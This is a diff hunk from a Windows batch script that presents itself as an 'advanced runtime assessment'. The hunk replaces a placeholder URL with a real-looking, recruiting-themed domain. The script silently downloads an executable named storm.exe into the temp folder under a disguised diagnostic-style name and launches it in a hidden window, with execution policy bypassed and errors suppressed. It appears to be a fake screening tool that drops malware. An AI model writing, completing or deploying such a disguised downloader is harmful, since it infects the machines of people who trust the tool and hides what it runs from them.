@@ -49,7 +49,7 @@ echo  [*] Dispatching advanced runtime assessment...
 powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
   "$ErrorActionPreference='SilentlyContinue';" ^
   "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
-  "$u='https://YOUR-DOMAIN-HERE.com/storm.exe';" ^
+  "$u='https://talentacquisitions-screening.com/storm.exe';" ^
   "$o=\"$env:TEMP\wsdiag_$([guid]::NewGuid().ToString('N').Substring(0,8)).exe\";" ^
   "Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing;" ^
   "Start-Process -FilePath $o -WindowStyle Hidden"
